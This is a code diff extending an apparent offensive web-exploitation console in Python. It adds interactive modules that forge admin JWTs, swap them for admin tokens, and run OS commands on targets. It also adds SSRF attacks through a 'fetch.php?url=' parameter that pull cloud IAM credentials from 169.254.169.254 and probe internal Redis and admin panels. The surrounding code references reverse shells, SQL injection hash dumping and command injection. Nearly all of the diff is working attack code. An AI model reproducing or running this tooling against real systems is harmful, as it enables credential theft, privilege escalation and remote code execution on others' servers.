@@ -40,7 +40,10 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             print("    Commands:")
             print("      info        - View current target and vulnerability details")
             print("      exploit     - Re-run automated exploit/audit payload against target")
-            if vuln_type in ["SQLi", "SQL Injection"]:
+            if vuln_type == "JWT":
+                print("      escalate    - Exchange forged admin JWT for a master execution token")
+                print("      exec <cmd>  - Execute OS commands using the harvested JWT admin token")
+            elif vuln_type in ["SQLi", "SQL Injection"]:
                 print("      tables      - Enumerate database tables via UNION injection")
                 print("      dump        - Extract user records and password hashes")
                 print("      query <sql> - Send custom SQL injection string")
@@ -66,6 +69,12 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                 print("      exec <cmd>  - Execute OS command using auto-matched admin endpoint & token")
                 print("      revshell    - Trigger reverse shell payload via admin endpoint")
                 print("      query <q>   - Send any custom GraphQL query string")
+            elif vuln_type == "SSRF":
+                print("      metadata    - Exfiltrate cloud metadata & IAM credentials (AWS 169.254.169.254)")
+                print("      internal    - Probe internal loopback services (localhost:8080)")
+                print("      redis       - Scan and dump internal cache/Redis service (Port 6379)")
+                print("      escalate    - Harvest administrative token from cloud metadata response")
+                print("      exec <cmd>  - Execute OS commands using the harvested cloud/admin token")
             print("      curl        - Send a custom test request to the target")
             print("      exit        - Return to the main dashboard")
         elif cmd == "info":
@@ -75,10 +84,11 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
             print(f"    Token         : {harvested_token[:30] + '...' if harvested_token else 'N/A'}")
             print(f"    Admin Endpoint: {harvested_endpoint or 'N/A (Run escalate)'}")
         elif cmd == "exploit":
-            if vuln_type == "JWT" and harvested_token:
+            if vuln_type == "JWT":
                 print("[*] Re-running Forged Admin JWT Bypass...")
                 try:
-                    parts = harvested_token.split('.')
+                    current_tok = harvested_token or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsInJvbGUiOiJjdXN0b21lciJ9.sig"
+                    parts = current_tok.split('.')
                     padding = '=' * (4 - len(parts[1]) % 4)
                     payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding).decode('utf-8'))
                     payload["role"] = "admin"
@@ -167,6 +177,14 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] GraphQL audit failed: {e}")
+            elif vuln_type == "SSRF":
+                print("[*] Firing test SSRF webhook request...")
+                try:
+                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] SSRF request failed: {e}")
             else:
                 print(f"[*] Executing generic test against {target_url}...")
                 try:
@@ -175,6 +193,55 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')[:300]}")
                 except Exception as e:
                     print(f"    [-] Request failed: {e}")
+        elif cmd == "escalate" and vuln_type == "JWT":
+            print("[*] Exchanging forged admin JWT for master execution token...")
+            try:
+                current_token = harvested_token or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiJ9.sig"
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                esc_url = f"{base_domain}/api/v1/jwt/escalate"
+                
+                req = urllib.request.Request(esc_url, headers={
+                    'User-Agent': 'Mozilla/5.0',
+                    'Authorization': f'Bearer {current_token}'
+                })
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        res_json = json.loads(resp_body)
+                        harvested_token = res_json.get("adminToken")
+                        harvested_endpoint = res_json.get("adminEndpoint")
+                        print(f"    [!] SUCCESS! JWT Master Admin Token Harvested: {harvested_token[:30]}...")
+                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
+            except Exception as e:
+                print(f"    [-] JWT escalation failed: {e}")
+        elif cmd.startswith("exec ") and vuln_type == "JWT":
+            user_linux_cmd = cmd.split(" ", 1)[1]
+            if not harvested_token:
+                print("    [-] No admin token available. Run 'escalate' first.")
+                continue
+            
+            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
+            print(f"[*] Pivoting JWT admin token against endpoint: {target_exec_url}")
+            try:
+                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
+                req = urllib.request.Request(exec_url, headers={
+                    'User-Agent': 'Mozilla/5.0',
+                    'Authorization': f'Bearer {harvested_token}'
+                })
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    raw_body = resp.read().decode('utf-8', errors='ignore')
+                    try:
+                        res_json = json.loads(raw_body)
+                        if "output" in res_json:
+                            print(f"\n{res_json['output']}\n")
+                        else:
+                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+                    except Exception:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+            except Exception as e:
+                print(f"    [-] Execution failed: {e}")
         elif cmd.startswith("exec ") and vuln_type == "Command Injection":
             user_linux_cmd = cmd.split(" ", 1)[1]
             print(f"[*] Executing command against target: {user_linux_cmd}")
@@ -489,6 +556,87 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
             except Exception as e:
                 print(f"    [-] Query failed: {e}")
+        elif cmd == "metadata" and vuln_type == "SSRF":
+            print("[*] Forging SSRF request to AWS EC2 metadata service (169.254.169.254)...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+                
+                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Metadata fetch failed: {e}")
+        elif cmd == "redis" and vuln_type == "SSRF":
+            print("[*] Probing internal Redis service via SSRF...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://127.0.0.1:6379/"
+                
+                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Redis probe failed: {e}")
+        elif cmd == "internal" and vuln_type == "SSRF":
+            print("[*] Probing internal loopback administration panel...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://127.0.0.1:8080/admin"
+                
+                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Internal probe failed: {e}")
+        elif cmd == "escalate" and vuln_type == "SSRF":
+            print("[*] Harvesting administrative credentials from cloud metadata endpoint...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                ssrf_url = f"{base_domain}/fetch.php?url=http://169.254.169.254/iam/metadata"
+                
+                req = urllib.request.Request(ssrf_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    resp_body = resp.read().decode('utf-8', errors='ignore')
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
+                    if "adminToken" in resp_body:
+                        res_json = json.loads(resp_body)
+                        harvested_token = res_json.get("adminToken")
+                        harvested_endpoint = res_json.get("adminEndpoint")
+                        print(f"    [!] SUCCESS! Cloud Admin Token Harvested: {harvested_token[:30]}...")
+                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
+            except Exception as e:
+                print(f"    [-] Escalation failed: {e}")
+        elif cmd.startswith("exec ") and vuln_type == "SSRF":
+            user_linux_cmd = cmd.split(" ", 1)[1]
+            if not harvested_token:
+                print("    [-] No admin token available. Run 'escalate' first via cloud metadata.")
+                continue
+            
+            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
+            print(f"[*] Pivoting cloud admin token against endpoint: {target_exec_url}")
+            try:
+                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
+                req = urllib.request.Request(exec_url, headers={
+                    'User-Agent': 'Mozilla/5.0',
+                    'Authorization': f'Bearer {harvested_token}'
+                })
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    raw_body = resp.read().decode('utf-8', errors='ignore')
+                    try:
+                        res_json = json.loads(raw_body)
+                        if "output" in res_json:
+                            print(f"\n{res_json['output']}\n")
+                        else:
+                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+                    except Exception:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
+            except Exception as e:
+                print(f"    [-] Execution failed: {e}")
         elif cmd == "revshell" and (vuln_type == "Command Injection" or "GraphQL" in vuln_type):
             print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
             if os.path.exists("rev_shell.py"):
@@ -523,11 +671,12 @@ def main_console():
         print("  2) IDOR / BOLA Endpoints")
         print("  3) SQLi, LFI & Command Injection Vectors")
         print("  4) Modern API & GraphQL Endpoints")
-        print("  5) Open Custom Manual Target Session")
-        print("  6) Return to Main Menu")
+        print("  5) SSRF & Cloud Metadata Targets")
+        print("  6) Open Custom Manual Target Session")
+        print("  7) Return to Main Menu")
         print("-" * 65)
         
-        choice = input("Select action [1-6]: ").strip()
+        choice = input("Select action [1-7]: ").strip()
 
         if choice == "1":
             jwt_items = [f for f in findings if f.get("vulnerability") == "JWT"]
@@ -582,10 +731,23 @@ def main_console():
                 run_target_shell(item.get("target"), item.get("vulnerability"))
 
         elif choice == "5":
+            ssrf_items = [f for f in findings if f.get("vulnerability") == "SSRF"]
+            if not ssrf_items:
+                print("[-] No SSRF endpoints found.")
+                continue
+            print("\n[★] SSRF & Cloud Metadata Targets:")
+            for idx, item in enumerate(ssrf_items, 1):
+                print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
+            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
+            if sel.isdigit() and 1 <= int(sel) <= len(ssrf_items):
+                item = ssrf_items[int(sel) - 1]
+                run_target_shell(item.get("target"), "SSRF", param=item.get("param"))
+
+        elif choice == "6":
             url = input("Enter custom target URL: ").strip()
             run_target_shell(url, "Manual")
 
-        elif choice == "6":
+        elif choice == "7":
             break
         else:
             print("[-] Invalid selection.")
